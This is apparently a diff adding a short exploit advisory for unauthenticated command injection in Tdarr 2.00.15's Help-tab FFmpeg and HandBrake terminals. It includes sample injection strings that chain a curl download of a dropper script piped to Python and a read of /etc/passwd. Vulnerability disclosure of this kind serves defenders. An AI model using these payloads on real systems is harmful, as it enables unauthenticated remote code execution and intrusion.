@@ -1,0 +1,15 @@
+# Exploit Title: Tdarr 2.00.15 - Command Injection
+# Date: 10/03/2022
+# Exploit Author: Sam Smith
+# Vendor Homepage: https://tdarr.io
+# Software Link: https://f000.backblazeb2.com/file/tdarrs/versions/2.00.15/linux_arm64/Tdarr_Server.zip
+# Version: 2.00.15 (likely also older versions)
+# Tested on: 2.00.15
+
+Exploit:
+
+The Help tab contains a terminal for both FFmpeg and HandBrake. These terminals do not include input filtering which allows the user to chain commands and spawn a reverse shell.
+
+eg. `--help; curl http://192.168.0.2/dropper.py | python` or `--help;whoami;cat /etc/passwd`.
+
+Tdarr is not protected by any auth by default and no credentials are required to trigger RCE
